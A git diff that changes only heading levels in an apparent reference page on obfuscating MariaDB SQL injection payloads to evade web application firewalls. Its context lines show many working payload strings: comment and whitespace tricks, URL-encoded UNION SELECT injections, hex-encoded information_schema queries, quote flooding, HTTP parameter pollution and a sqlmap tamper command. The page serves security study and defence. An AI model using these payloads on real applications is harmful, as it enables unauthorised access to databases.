@@ -7,11 +7,9 @@ tags: ["bypass", "WAF", "obfuscation", "filter evasion"]
 lastUpdated: 2025-12-18
 ---
 
-## Fuzzing and Obfuscation
-
 Modern web applications often employ Web Application Firewalls (WAFs) and other security measures to detect and block SQL injection attempts. Fuzzing and obfuscation techniques can help bypass these protections by disguising SQL injection payloads.
 
-### Comment Variations
+## Comment Variations
 
 MariaDB supports various comment styles that can be inserted between SQL tokens (keywords, identifiers, operators), but **cannot split tokens themselves** (e.g., `SEL/**/ECT` is invalid).
 
@@ -33,7 +31,7 @@ SELECT /*! username */ FROM users
 SELECT * FROM users -- this is a comment
 ```
 
-### Comment Limitations
+## Comment Limitations
 
 ```sql
 -- INVALID: Comments cannot split keywords
@@ -48,11 +46,11 @@ SELECT 1 UNI/**/ON SELECT 2
 SELECT/**/ username /**/FROM/**/ users WHERE id = 1
 ```
 
-### Whitespace Manipulation
+## Whitespace Manipulation
 
 MariaDB is generally flexible with whitespace, allowing creative formatting.
 
-#### Allowed Intermediary Characters (Whitespace Alternatives)
+### Allowed Intermediary Characters (Whitespace Alternatives)
 
 These characters can substitute for spaces in MariaDB queries:
 
@@ -81,7 +79,7 @@ These characters can substitute for spaces in MariaDB queries:
 '%0A%09UNION%0CSELECT%0BNULL%20%23
 ```
 
-#### Whitespace Examples
+### Whitespace Examples
 
 ```sql
 -- Using tabs, newlines, and carriage returns
@@ -102,7 +100,7 @@ SELECT id, username FROM users WHERE id = 1 UNION
 SELECT 999, 'mixed_ws'
 ```
 
-#### Whitespace in UNION SELECT Context
+### Whitespace in UNION SELECT Context
 
 Alternative whitespace characters between UNION and SELECT:
 
@@ -124,7 +122,7 @@ SELECT id FROM users UNION%0CSELECT 999
 SELECT id FROM users UNION%0BSELECT 999
 ```
 
-#### Characters Allowed After AND/OR
+### Characters Allowed After AND/OR
 
 These characters can immediately follow `AND` or `OR` without spaces:
 
@@ -156,7 +154,7 @@ SELECT * FROM users WHERE id = 1 AND!0
 SELECT * FROM users WHERE id = 1 OR@a
 ```
 
-#### Characters After SELECT Without Space
+### Characters After SELECT Without Space
 
 Certain characters can immediately follow SELECT without whitespace:
 
@@ -189,7 +187,7 @@ SELECT 1e1 AS val   -- Valid: scientific notation with space (returns 10)
 SELECT(1e1) AS val  -- Valid: parentheses (returns 10)
 ```
 
-#### Parentheses as Whitespace Alternatives
+### Parentheses as Whitespace Alternatives
 
 ```sql
 -- No spaces needed with parentheses
@@ -205,7 +203,7 @@ SELECT id, username FROM users WHERE id = 1 UNION((SELECT 999, 'nested'))
 SELECT 1 AS val UNION(SELECT 2)
 ```
 
-### Case Variation
+## Case Variation
 
 MariaDB keywords are case-insensitive, but identifier case-sensitivity depends on the operating system:
 
@@ -232,7 +230,7 @@ This means `SELECT * FROM USERS` may fail on Linux if the table was created as `
 
 **Cross-platform implications:** When migrating databases between platforms with different defaults, identifier mismatches can occur. For maximum portability across platforms, set `lower_case_table_names=1` on all systems before database initialization. Note that this variable cannot be changed after the database is initialized.
 
-### Operator Alternatives
+## Operator Alternatives
 
 Many operators have alternative representations:
 
@@ -251,7 +249,7 @@ id=1
 id<=>1
 ```
 
-#### NULL-Safe Equal Operator
+### NULL-Safe Equal Operator
 
 The `<=>` operator is NULL-safe, meaning `NULL <=> NULL` returns 1 (true), unlike regular `=` where `NULL = NULL` returns NULL:
 
@@ -268,7 +266,7 @@ SELECT NULL = NULL AS result
 SELECT * FROM users WHERE id <=> 1
 ```
 
-### String Representation
+## String Representation
 
 Strings can be represented in multiple ways:
 
@@ -297,7 +295,7 @@ SELECT UNHEX('61646d696e') AS val
 -- Returns: 'admin'
 ```
 
-### Numeric Representation
+## Numeric Representation
 
 Numbers can be represented in various ways:
 
@@ -317,7 +315,7 @@ SELECT * FROM users WHERE id = 0x1 -- hex for 1
 SELECT * FROM users WHERE id = 1e0
 ```
 
-### Function Call Obfuscation
+## Function Call Obfuscation
 
 Function names cannot be dynamically constructed, but execution can be obfuscated:
 
@@ -336,7 +334,7 @@ SELECT CONCAT('SEL','ECT') AS keyword
 -- Returns: 'SELECT' (a string, not executed as keyword)
 ```
 
-### UNION Query Obfuscation
+## UNION Query Obfuscation
 
 ```sql
 -- Adding redundant WHERE (requires FROM clause)
@@ -366,9 +364,9 @@ UNION ALL SELECT 999, (CASE WHEN (1=1) THEN 'true_branch' ELSE 'false_branch' EN
 - Some versions require `FROM dual` when using WHERE
 - Modern versions may allow `SELECT 1 WHERE 1=1` without FROM
 
-### Encoding Bypasses
+## Encoding Bypasses
 
-#### URL Encoding
+### URL Encoding
 
 ```text
 -- Standard URL encoding (RFC 3986)
@@ -383,7 +381,7 @@ UNION ALL SELECT 999, (CASE WHEN (1=1) THEN 'true_branch' ELSE 'false_branch' EN
 
 **Note on `%uXXXX` encoding:** This is a legacy JavaScript escape format, not RFC 3986 compliant. The MariaDB SQL parser does **not** decode this encoding - decoding must occur at the application/middleware layer (web server, framework, WAF, or JavaScript) before the query reaches the database. Bypass potential exists when there's inconsistent handling between WAF decoding and backend application processing.
 
-### Comment Obfuscation with Newlines
+## Comment Obfuscation with Newlines
 
 Using newlines within comment sequences to bypass pattern matching:
 
@@ -415,9 +413,9 @@ comment
 */OR 1=1
 ```
 
-### Keyword Bypass Techniques
+## Keyword Bypass Techniques
 
-#### Spaces in Identifiers
+### Spaces in Identifiers
 
 MariaDB allows spaces around dots in qualified names:
 
@@ -426,7 +424,7 @@ information_schema . tables
 information_schema . columns
 ```
 
-#### Backtick Escaping
+### Backtick Escaping
 
 Use backticks to quote identifiers:
 
@@ -435,7 +433,7 @@ Use backticks to quote identifiers:
 `information_schema`.`columns`
 ```
 
-#### Comments Around Dots
+### Comments Around Dots
 
 ```sql
 -- Comments around the dot in qualified names
@@ -445,7 +443,7 @@ SELECT table_name FROM information_schema/**/./**/tables LIMIT 1
 SELECT column_name FROM information_schema . columns LIMIT 1
 ```
 
-#### Version-Specific Execution
+### Version-Specific Execution
 
 ```sql
 -- Always executed by MariaDB
@@ -455,7 +453,7 @@ SELECT column_name FROM information_schema . columns LIMIT 1
 /*!50000 SELECT */ * FROM users
 ```
 
-#### Symbol Spam
+### Symbol Spam
 
 Using valid arithmetic operators to confuse WAFs:
 
@@ -469,7 +467,7 @@ SELECT * FROM users WHERE id = 1 AND -+--+--+~~((1))
 
 These constructs are syntactically valid due to MariaDB's handling of unary operators.
 
-#### Quote Flooding
+### Quote Flooding
 
 Using excessive quotes to bypass WAFs that count quotes:
 
@@ -488,9 +486,9 @@ SELECT '1''''''''''''UNION SELECT ''2'
 
 **How it works:** In MariaDB, two consecutive single quotes inside a string literal escape to one quote. `'1''''''` means the string contains `1'''`. WAFs that simply count quotes may misinterpret the structure.
 
-### Practical Examples
+## Practical Examples
 
-#### Bypassing Simple Keyword Filters
+### Bypassing Simple Keyword Filters
 
 If 'SELECT' is blocked:
 
@@ -507,7 +505,7 @@ SELECT%09username%0AFROM%0Dusers
 
 **Note:** String concatenation (`CONCAT('SEL','ECT')`) cannot be used to construct SQL keywords. Keywords must appear literally in the query.
 
-#### Information Schema Queries with Hex
+### Information Schema Queries with Hex
 
 ```sql
 -- Table name with hex encoding in LIKE
@@ -521,7 +519,7 @@ SELECT * FROM (SELECT table_name FROM information_schema.tables WHERE table_name
 SELECT `column_name` FROM `information_schema`.`columns` WHERE `table_name` = 'users' LIMIT 1
 ```
 
-#### Bypassing WAF Pattern Recognition
+### Bypassing WAF Pattern Recognition
 
 ```sql
 -- Complex nested logic
@@ -533,7 +531,7 @@ SELECT * FROM users WHERE id = 1 AND 0x1=0x1
 UNION SELECT 1, UNHEX('61646D696E')
 ```
 
-#### HTTP Parameter Pollution
+### HTTP Parameter Pollution
 
 Some WAFs can be bypassed by splitting the payload across multiple parameters:
 
@@ -541,7 +539,7 @@ Some WAFs can be bypassed by splitting the payload across multiple parameters:
 ?id=1/*&id=*/UNION/*&id=*/SELECT/*&id=*/1,2,3
 ```
 
-### Automated Fuzzing
+## Automated Fuzzing
 
 Tools like SQLMap include fuzzing capabilities to automatically test various bypass techniques:
 
@@ -549,7 +547,7 @@ Tools like SQLMap include fuzzing capabilities to automatically test various byp
 sqlmap --url="http://target/page.php?id=1" --tamper=space2comment,charencode --random-agent
 ```
 
-### Mitigation
+## Mitigation
 
 To protect against obfuscation techniques:
 
